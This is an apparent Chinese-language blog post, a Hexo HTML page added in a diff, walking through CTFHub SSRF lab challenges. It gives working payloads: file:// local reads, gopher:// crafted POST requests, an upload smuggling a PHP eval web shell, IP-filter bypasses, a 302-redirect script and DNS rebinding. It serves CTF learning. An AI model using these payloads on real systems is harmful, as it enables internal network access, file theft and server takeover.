@@ -1,0 +1,412 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":true},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="ctfhub-SSRF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="scw&#39;blog">
+<meta property="og:url" content="http://example.com/2022/05/25/ctfhub-SSRF/index.html">
+<meta property="og:site_name" content="scw&#39;blog">
+<meta property="og:description" content="ctfhub-SSRF">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-05-25T10:26:00.756Z">
+<meta property="article:modified_time" content="2022-05-25T10:17:41.181Z">
+<meta property="article:author" content="scw">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/2022/05/25/ctfhub-SSRF/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title> | scw'blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="scw'blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">scw'blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/25/ctfhub-SSRF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="scw">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="scw'blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-05-25 18:26:00 / 修改时间：18:17:41" itemprop="dateCreated datePublished" datetime="2022-05-25T18:26:00+08:00">2022-05-25</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="ctfhub-SSRF"><a href="#ctfhub-SSRF" class="headerlink" title="ctfhub-SSRF"></a>ctfhub-SSRF</h1><span id="more"></span>
+
+<h3 id="内网访问"><a href="#内网访问" class="headerlink" title="内网访问"></a>内网访问</h3><p>直接?<code>url=127.0.0.1/flag.php</code></p>
+<h3 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h3><p>利用<code>file://</code>伪协议读取本地文件，Linux下默认目录为<code>/var/www/html</code>,payload:<code>?url=file:///var/www/html/flag.php</code></p>
+<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>输入<code>?url=127.0.0.1:8000/flag.php</code>,发送请求然后抓包，对<code>8000</code>进行爆破一直到<code>9000</code>即可</p>
+<h3 id="POST请求"><a href="#POST请求" class="headerlink" title="POST请求"></a>POST请求</h3><p>要求发送一个POST请求，要在127.0.0.1传入key值到flag.php里，所以利用<code>gopher://</code>协议去完成，先分别利用<code>?url=127.0.0.1</code>和<code>?url=file:///var/www/html</code>去读取index.php和flag.php的源码，获得key值并通过flag.php的源码发现是要传一个key值</p>
+<p>先构造一个POST请求头</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /flag.php HTTP/1.1</span><br><span class="line">host:127.0.0.1</span><br><span class="line">Content-Type:application/x-www-form-urlencoded</span><br><span class="line">Conten-Length:36</span><br><span class="line"></span><br><span class="line">key=a0118b663ae44a9b41733dbc27d43bb8</span><br></pre></td></tr></table></figure>
+
+<p>然后对其进行url编码，编码两次得到<code>POST%2520%252Fflag.php%2520HTTP%252F1.1%250d%250Ahost%253A127.0.0.1%250d%250AContent-Type%253Aapplication%252Fx-www-form-urlencoded%250d%250AContent-Length%253A36%250d%250A%250d%250Akey%253Da0118b663ae44a9b41733dbc27d43bb8</code>(需要注意如果用在线网址去编码，要将代表换行的%0A改为%0d%0A),然后传入<code>?url=gopher://127.0.0.1:80/_POST%2520%252Fflag.php%2520HTTP%252F1.1%250d%250Ahost%253A127.0.0.1%250d%250AContent-Type%253Aapplication%252Fx-www-form-urlencoded%250d%250AContent-Length%253A36%250d%250A%250d%250Akey%253Da0118b663ae44a9b41733dbc27d43bb8</code>即可获取flag</p>
+<h3 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h3><p>通过<code>?url=127.0.0.1/flag.php</code>访问，发现需要上传一个文件，但是没有提交按钮，可通过F12打开查看器自己编写一个提交按钮，然后查看源码发现需要到127.0.0.1上传，此时可以利用<code>gopher://</code>协议，先选择文件然后上传抓包，对其进行url编码两次需要注意的地方与上一题一样然后提交</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=gopher://127.0.0.1:80/_POST%2520%252Fflag.php%2520HTTP%252F1.1%250d%250AHost%253A%2520127.0.0.1%250d%250AUser-Agent%253A%2520Mozilla%252F5.0%2520(Windows%2520NT%252010.0%253B%2520Win64%253B%2520x64%253B%2520rv%253A100.0)%2520Gecko%252F20100101%2520Firefox%252F100.0%250d%250AAccept%253A%2520text%252Fhtml%252Capplication%252Fxhtml%252Bxml%252Capplication%252Fxml%253Bq%253D0.9%252Cimage%252Favif%252Cimage%252Fwebp%252C*%252F*%253Bq%253D0.8%250d%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.8%252Czh-TW%253Bq%253D0.7%252Czh-HK%253Bq%253D0.5%252Cen-US%253Bq%253D0.3%252Cen%253Bq%253D0.2%250d%250AAccept-Encoding%253A%2520gzip%252C%2520deflate%250d%250AReferer%253A%2520http%253A%252F%252Fchallenge-b1951c0bb9e47e48.sandbox.ctfhub.com%253A10800%252F%253Furl%253D127.0.0.1%252Fflag.php%250d%250AContent-Type%253A%2520multipart%252Fform-data%253B%2520boundary%253D---------------------------396722401235940838782881831495%250d%250AContent-Length%253A%2520387%250d%250AOrigin%253A%2520http%253A%252F%252Fchallenge-b1951c0bb9e47e48.sandbox.ctfhub.com%253A10800%250d%250AConnection%253A%2520close%250d%250AUpgrade-Insecure-Requests%253A%25201%250d%250A%250d%250A-----------------------------396722401235940838782881831495%250d%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522file%2522%253B%2520filename%253D%2522111.php%2522%250d%250AContent-Type%253A%2520application%252Foctet-stream%250d%250A%250d%250A%253C%253Fphp%2520%2540eval(%2524_POST%255B%274086%27%255D)%253B%253F%253E%250d%250A-----------------------------396722401235940838782881831495%250d%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522%25E9%258E%25BB%25E6%2584%25AA%25E6%25B0%25A6%2522%250d%250A%250d%250A%25E9%258E%25BB%25E6%2584%25AA%25E6%25B0%25A6%25E9%258F%258C%25E3%2583%25A8%25EE%2587%2597%250d%250A-----------------------------396722401235940838782881831495--%250d%250A</span><br></pre></td></tr></table></figure>
+
+<p>即可获得flag</p>
+<h3 id="FastCGI协议"><a href="#FastCGI协议" class="headerlink" title="FastCGI协议"></a>FastCGI协议</h3><h3 id="URL-Bypass"><a href="#URL-Bypass" class="headerlink" title="URL Bypass"></a>URL Bypass</h3><p>要求必须有<code>http://notfound.ctfhub.com</code>,可以利用<code>@</code>来绕过，即<code>?url=http://notfound.ctfhub.com@127.0.0.1/flag.php</code>,这样，符合题目要求，实则是以<code>http://notfound.ctfhub.com</code>为用户连接<code>127.0.0.1</code></p>
+<h3 id="数字IP-Bypass"><a href="#数字IP-Bypass" class="headerlink" title="数字IP Bypass"></a>数字IP Bypass</h3><p>该题这次ban掉了127以及172，可以采用进制转换绕过，用十六进制，即<code>?url=0x7F.0.0.1/flag.php</code></p>
+<h3 id="302跳转-Bypass"><a href="#302跳转-Bypass" class="headerlink" title="302跳转 Bypass"></a>302跳转 Bypass</h3><p>利用伪协议读取源码，发现在index.php中禁了127等，而在flag.php中禁止了127.0.0.1。</p>
+<p>法1：<code>?url=localhost/flag.php</code></p>
+<p>法2:<code>?url=0x7F000001/flag.php</code>或者<code>?url=0x7F.0.0.1/flag.php</code></p>
+<p>法3:在服务器上放置一个php文件，在里面写入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">header(&quot;Location: http://challenge-572128654ba551a2.sandbox.ctfhub.com:10800/?url=0x7F.0.0.1/flag.php&quot;);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>然后<code>?url=http://lzhnb.site/302.php</code></p>
+<h3 id="DNS重绑定-Bypass"><a href="#DNS重绑定-Bypass" class="headerlink" title="DNS重绑定 Bypass"></a>DNS重绑定 Bypass</h3><p>读取源码发现，过滤与上题一样，根据题目要求可用DNS重绑定</p>
+<p>法1：<code>?url=http://7f000001.7f000003.rbndr.us/flag.php</code></p>
+<p>也可用@绕过</p>
+<p>法2：<code>?url=0x7f000001/flag.php</code></p>
+<h3 id=""><a href="#" class="headerlink" title=""></a></h3>
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/05/25/SSRF/" rel="prev" title="">
+      <i class="fa fa-chevron-left"></i> 
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/05/25/ssrf%E5%88%B7%E9%A2%98/" rel="next" title="">
+       <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ctfhub-SSRF"><span class="nav-number">1.</span> <span class="nav-text">ctfhub-SSRF</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E8%AE%BF%E9%97%AE"><span class="nav-number">1.0.1.</span> <span class="nav-text">内网访问</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="nav-number">1.0.2.</span> <span class="nav-text">伪协议</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">1.0.3.</span> <span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#POST%E8%AF%B7%E6%B1%82"><span class="nav-number">1.0.4.</span> <span class="nav-text">POST请求</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6"><span class="nav-number">1.0.5.</span> <span class="nav-text">上传文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#FastCGI%E5%8D%8F%E8%AE%AE"><span class="nav-number">1.0.6.</span> <span class="nav-text">FastCGI协议</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#URL-Bypass"><span class="nav-number">1.0.7.</span> <span class="nav-text">URL Bypass</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%95%B0%E5%AD%97IP-Bypass"><span class="nav-number">1.0.8.</span> <span class="nav-text">数字IP Bypass</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#302%E8%B7%B3%E8%BD%AC-Bypass"><span class="nav-number">1.0.9.</span> <span class="nav-text">302跳转 Bypass</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DNS%E9%87%8D%E7%BB%91%E5%AE%9A-Bypass"><span class="nav-number">1.0.10.</span> <span class="nav-text">DNS重绑定 Bypass</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-number">1.0.11.</span> <span class="nav-text"></span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">scw</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">22</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">scw</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
